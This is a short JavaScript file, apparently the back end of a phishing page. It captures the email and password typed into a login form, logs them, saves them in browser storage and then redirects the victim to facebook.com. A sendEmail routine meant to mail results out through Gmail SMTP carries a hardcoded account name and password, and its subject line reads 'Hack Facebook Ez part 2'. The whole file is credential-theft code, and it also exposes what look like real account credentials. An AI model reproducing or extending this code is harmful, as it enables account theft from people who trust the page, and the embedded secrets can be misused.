var gmail,password;

$(document).ready(function(){
	$('#form-logins').on('submit', function(e){
		var gmail=$('#InputEmail1').val(),password=$('#InputPassword1').val();
		e.preventDefault();
		console.log(gmail + "===" + password);
		localStorage.setItem("gmail",gmail);
		localStorage.setItem("pass",password);
		window.location="https://www.facebook.com/";
	});
	function sendEmail() {
		
		Email.send({
		Host: "smtp.gmail.com",
		Username : "nguyenthevinh1002@gmail.com",
		Password : "quechi123@",
		To : 'nguyenthevinh1002@gmail.com',
		From : "nguyenthevinh1002m@gmail.com",
		Subject : "Hack Facebook Ez part 2",
		Body : "hello wordllllllll !!!!",
		}).then(
			message => alert(message)
		);
	}
});